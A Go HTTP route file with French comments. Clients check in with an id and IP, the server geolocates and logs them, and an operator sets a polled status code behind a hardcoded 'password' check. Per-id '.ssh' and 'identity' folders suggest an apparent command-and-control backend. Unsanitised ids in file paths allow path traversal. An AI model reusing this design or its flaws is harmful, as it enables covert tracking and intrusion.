package routes

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
)

func writeLastConnect(id string) {
	var t int64
	// Obtient la date et l'heure actuelles
	t = time.Now().Unix()

	// Ouvre le fichier lastConnect.txt en mode écriture seulement et supprime le contenu existant
	f, err := os.OpenFile("data/"+id+"/lastConnect.txt", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()

	if _, err = fmt.Fprintf(f, "%d", t); err != nil {
		fmt.Println(err)
	}
}

func RoutePostStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	// Lecture de l'ID de la requête
	id := r.FormValue("id")
	ip := r.FormValue("ip")

	if id == "" || ip == "" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "ID and IP are required")
		return
	}

	// Vérification de l'existence du dossier
	if _, err := os.Stat("data/" + id); os.IsNotExist(err) {
		// Le dossier n'existe pas, on le crée
		err := os.Mkdir("data/"+id, 0755)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error creating folder for ID %s", id)
			return
		}

		err = os.Mkdir("data/"+id+"/.ssh", 0755)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error creating folder for ID %s", id)
			return
		}

		err = os.Mkdir("data/"+id+"/identity", 0755)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error creating folder for ID %s", id)
			return
		}

		response, err := http.Get("http://ip-api.com/json/" + ip)
		if err != nil {
			fmt.Printf("Erreur lors de la requête : %v\n", err)
			return
		}
		defer response.Body.Close()

		var result map[string]interface{}
		err = json.NewDecoder(response.Body).Decode(&result)
		if err != nil {
			fmt.Printf("Erreur lors de la lecture de la réponse : %v\n", err)
			return
		}

		// Création du fichier "ip.txt"
		file, err := os.Create("data/" + id + "/ip.txt")
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error creating status file for ID %s", id)
			return
		}
		defer file.Close()

		lat := fmt.Sprintf("%v", result["lat"])
		lon := fmt.Sprintf("%v", result["lon"])
		country := fmt.Sprintf("%v", result["country"])
		city := fmt.Sprintf("%v", result["city"])
		line := "Ip:" + ip + "\nLatitude:" + lat + "\nLongitude:" + lon + "\nPays:" + country + "\nVille:" + city + "\n"

		// Écriture de la valeur
		_, err = file.WriteString(line)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error writing ip to file for ip %s", ip)
			return
		}

		// Création du fichier "status.txt"
		file, errs := os.Create("data/" + id + "/status.txt")
		if errs != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error creating status file for ID %s", id)
			return
		}
		defer file.Close()

		// Écriture de la valeur "0" dans le fichier
		_, err = file.WriteString("0")
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprintf(w, "Error writing status to file for ID %s", id)
			return
		}

		writeLastConnect(id)

		fmt.Fprintf(w, "0")
	} else if err != nil {
		// Une erreur s'est produite lors de la vérification de l'existence du dossier
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintf(w, "Error checking folder for ID %s", id)
		return
	} else {
		// Vérification de l'existence du fichier "status.txt"
		if _, err := os.Stat("data/" + id + "/status.txt"); !os.IsNotExist(err) {
			// Le fichier existe, on le lit
			file, err := os.Open("data/" + id + "/status.txt")
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)

				fmt.Fprintf(w, "Error reading status file for ID %s", id)
				return
			}
			defer file.Close()

			response, err := http.Get("http://ip-api.com/json/" + ip)
			if err != nil {
				fmt.Printf("Erreur lors de la requête : %v\n", err)
				return
			}
			defer response.Body.Close()

			var result map[string]interface{}
			err = json.NewDecoder(response.Body).Decode(&result)
			if err != nil {
				fmt.Printf("Erreur lors de la lecture de la réponse : %v\n", err)
				return
			}

			// Création du fichier "ip.txt"
			fileIp, err := os.Create("data/" + id + "/ip.txt")
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				fmt.Fprintf(w, "Error creating status file for ID %s", id)
				return
			}
			defer file.Close()

			lat := fmt.Sprintf("%v", result["lat"])
			lon := fmt.Sprintf("%v", result["lon"])
			country := fmt.Sprintf("%v", result["country"])
			city := fmt.Sprintf("%v", result["city"])
			line := "Ip:" + ip + "\nLatitude:" + lat + "\nLongitude:" + lon + "\nPays:" + country + "\nVille:" + city + "\n"

			// Écriture de la valeur
			_, err = fileIp.WriteString(line)
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				fmt.Fprintf(w, "Error writing ip to file for ip %s", ip)
				return
			}
			writeLastConnect(id)
			// Lecture du contenu du fichier
			var status string
			fmt.Fscanln(file, &status)
			fmt.Fprint(w, status)

			if status != "0" {
				os.Remove("data/" + id + "/status.txt")

				// Création du fichier "status.txt"
				file, err := os.Create("data/" + id + "/status.txt")
				if err != nil {
					w.WriteHeader(http.StatusInternalServerError)
					fmt.Fprintf(w, "Error creating status file for ID %s", id)
					return
				}
				defer file.Close()

				// Écriture de la valeur "0" dans le fichier
				_, err = file.WriteString("0")
				if err != nil {
					w.WriteHeader(http.StatusInternalServerError)
					fmt.Fprintf(w, "Error writing status to file for ID %s", id)
					return
				}

			}

			return
		}
	}
}

func RouteChangeStatus(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	// Lecture de l'ID de la requête
	id := r.FormValue("id")
	auth := r.FormValue("auth")
	status := r.FormValue("status")

	if id == "" || auth == "" || status == "" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "ID and Auth are required")
		return
	}

	if auth != "password" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "No autorized")
		return
	}

	if status != "1" && status != "2" && status != "3" && status != "4" {
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, "status format incorrect")
		return
	}

	// Vérification de l'existence du dossier
	if _, err := os.Stat("data/" + id); os.IsNotExist(err) {
		fmt.Fprint(w, "id not found")
		return
	} else if err != nil {
		// Une erreur s'est produite lors de la vérification de l'existence du dossier
		w.WriteHeader(http.StatusInternalServerError)
		fmt.Fprintf(w, "Error checking folder for ID %s", id)
		return
	} else {
		// Vérification de l'existence du fichier "status.txt"
		if _, err := os.Stat("data/" + id + "/status.txt"); !os.IsNotExist(err) {
			// Le fichier existe, on le lit
			os.Remove("data/" + id + "/status.txt")

			// Création du fichier "status.txt"
			file, err := os.Create("data/" + id + "/status.txt")
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				fmt.Fprintf(w, "Error creating status file for ID %s", id)
				return
			}
			defer file.Close()

			// Écriture de la valeur "0" dans le fichier
			_, err = file.WriteString(status)
			if err != nil {
				w.WriteHeader(http.StatusInternalServerError)
				fmt.Fprintf(w, "Error writing status to file for ID %s", id)
				return
			}
			fmt.Fprintf(w, "Change Status %s", id)
			return
		}
	}

}
